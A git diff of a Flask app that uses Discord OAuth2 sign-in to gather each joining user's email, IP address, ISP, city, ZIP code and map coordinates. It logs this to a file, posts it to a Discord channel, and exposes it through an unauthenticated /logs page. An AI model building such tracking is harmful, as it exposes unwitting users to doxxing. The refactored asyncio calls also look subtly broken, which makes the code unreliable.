@@ -1,12 +1,18 @@
-from flask import Flask, request, render_template
-import requests, json, os, threading
-from dotenv import load_dotenv
+# main.py
+import os
+import json
+import threading
+import asyncio
 from datetime import datetime
-from discord_bot import bot, task_queue
+
+import requests
+from flask import Flask, request, render_template
+from dotenv import load_dotenv
 from user_agents import parse
 
 load_dotenv()
 app = Flask(__name__)
+
 ACCESS_LOG_FILE = "access_log.json"
 
 DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
@@ -15,15 +21,22 @@ DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
 DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
 
+# -----------------------------
+# Discord Bot 起動
+# -----------------------------
+def start_bot():
+    from discord_bot import bot  # discord_bot.py に bot, log_queue, assign_role が定義されている
+    threading.Thread(target=lambda: bot.run(DISCORD_BOT_TOKEN), daemon=True).start()
 
-# -------------------------------
-# ユーティリティ
-# -------------------------------
+start_bot()  # import時にBOT起動
+
+# -----------------------------
+# IP/Geo情報取得
+# -----------------------------
 def get_client_ip():
     if "X-Forwarded-For" in request.headers:
         return request.headers["X-Forwarded-For"].split(",")[0].strip()
     return request.remote_addr
-
 
 def get_geo_info(ip):
     try:
@@ -59,7 +72,9 @@ def get_geo_info(ip):
             "hosting": False,
         }
 
-
+# -----------------------------
+# アクセスログ保存
+# -----------------------------
 def save_log(discord_id, structured_data):
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     if os.path.exists(ACCESS_LOG_FILE):
@@ -77,10 +92,9 @@ def save_log(discord_id, structured_data):
     with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=4, ensure_ascii=False)
 
-
-# -------------------------------
-# ルーティング
-# -------------------------------
+# -----------------------------
+# ルート
+# -----------------------------
 @app.route("/")
 def index():
     discord_auth_url = (
@@ -89,9 +103,13 @@ def index():
     )
     return render_template("index.html", discord_auth_url=discord_auth_url)
 
-
+# -----------------------------
+# Discord OAuth2 コールバック
+# -----------------------------
 @app.route("/callback")
 def callback():
+    from discord_bot import log_queue, assign_role
+
     code = request.args.get("code")
     if not code:
         return "コードがありません", 400
@@ -126,10 +144,7 @@ def callback():
     # サーバー参加
     requests.put(
         f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
-        headers={
-            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
-            "Content-Type": "application/json",
-        },
+        headers={"Authorization": f"Bot {DISCORD_BOT_TOKEN}", "Content-Type": "application/json"},
         json={"access_token": access_token},
     )
 
@@ -143,8 +158,7 @@ def callback():
 
     avatar_url = (
         f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024"
-        if user.get("avatar")
-        else "https://cdn.discordapp.com/embed/avatars/0.png"
+        if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"
     )
 
     structured_data = {
@@ -175,61 +189,41 @@ def callback():
 
     save_log(user["id"], structured_data)
 
-    # -------------------------------
-    # Discord通知を task_queue に送信
-    # -------------------------------
+    # Discord Embed送信
     try:
         d = structured_data["discord"]
         ip_data = structured_data["ip_info"]
         ua_data = structured_data["user_agent"]
 
         embed_data = {
-            "action": "send_log",
-            "embed": {
-                "title": "✅ 新しいアクセスログ",
-                "description": (
-                    f"**名前:** {d['username']}#{d['discriminator']}\n"
-                    f"**ID:** {d['id']}\n"
-                    f"**メール:** {d['email']}\n"
-                    f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
-                    f"**IP:** {ip_data['ip']} / Proxy: {ip_data['proxy']} / Hosting: {ip_data['hosting']}\n"
-                    f"**国:** {ip_data['country']} / {ip_data['region']} / {ip_data['city']} / {ip_data['zip']}\n"
-                    f"**ISP:** {ip_data['isp']} / AS: {ip_data['as']}\n"
-                    f"**UA:** {ua_data['raw']}\n"
-                    f"**OS:** {ua_data['os']} / ブラウザ: {ua_data['browser']}\n"
-                    f"**デバイス:** {ua_data['device']} / Bot判定: {ua_data['is_bot']}\n"
-                    f"📍 [地図リンク](https://www.google.com/maps?q={ip_data['lat']},{ip_data['lon']})"
-                ),
-                "thumbnail": {"url": d["avatar_url"]},
-            },
+            "title": "✅ 新しいアクセスログ",
+            "description": (
+                f"**名前:** {d['username']}#{d['discriminator']}\n"
+                f"**ID:** {d['id']}\n"
+                f"**メール:** {d['email']}\n"
+                f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
+                f"**IP:** {ip_data['ip']} / Proxy: {ip_data['proxy']} / Hosting: {ip_data['hosting']}\n"
+                f"**国:** {ip_data['country']} / {ip_data['region']} / {ip_data['city']} / {ip_data['zip']}\n"
+                f"**ISP:** {ip_data['isp']} / AS: {ip_data['as']}\n"
+                f"**UA:** {ua_data['raw']}\n"
+                f"**OS:** {ua_data['os']} / ブラウザ: {ua_data['browser']}\n"
+                f"**デバイス:** {ua_data['device']} / Bot判定: {ua_data['is_bot']}\n"
+                f"📍 [地図リンク](https://www.google.com/maps?q={ip_data['lat']},{ip_data['lon']})"
+            ),
+            "thumbnail": {"url": d["avatar_url"]},
         }
-        task_queue.put_nowait(embed_data)
 
-        if ip_data["proxy"] or ip_data["hosting"]:
-            warn_msg = {
-                "action": "send_log",
-                "embed": {
-                    "title": "⚠️ 不審なアクセス検出",
-                    "description": (
-                        f"{d['username']}#{d['discriminator']} (ID: {d['id']})\n"
-                        f"IP: {ip_data['ip']} / Proxy: {ip_data['proxy']} / Hosting: {ip_data['hosting']}"
-                    ),
-                },
-            }
-            task_queue.put_nowait(warn_msg)
-
-        # ロール付与もキューに依頼
-        task_queue.put_nowait({
-            "action": "assign_role",
-            "user_id": d["id"]
-        })
+        asyncio.run_coroutine_threadsafe(log_queue.put(embed_data), asyncio.get_event_loop())
+        asyncio.run_coroutine_threadsafe(assign_role(d["id"]), asyncio.get_event_loop())
 
     except Exception as e:
         print("Embed送信エラー:", e)
 
     return render_template("welcome.html", username=d["username"], discriminator=d["discriminator"])
 
-
+# -----------------------------
+# ログ表示
+# -----------------------------
 @app.route("/logs")
 def show_logs():
     if os.path.exists(ACCESS_LOG_FILE):
@@ -239,15 +233,9 @@ def show_logs():
         logs = {}
     return render_template("logs.html", logs=logs)
 
-
-# -------------------------------
-# BOT起動
-# -------------------------------
-def run_bot():
-    bot.run(DISCORD_BOT_TOKEN)
-
-
+# -----------------------------
+# Render 用: Flask 起動
+# -----------------------------
 if __name__ == "__main__":
-    threading.Thread(target=run_bot, daemon=True).start()
     port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=port, threaded=True)
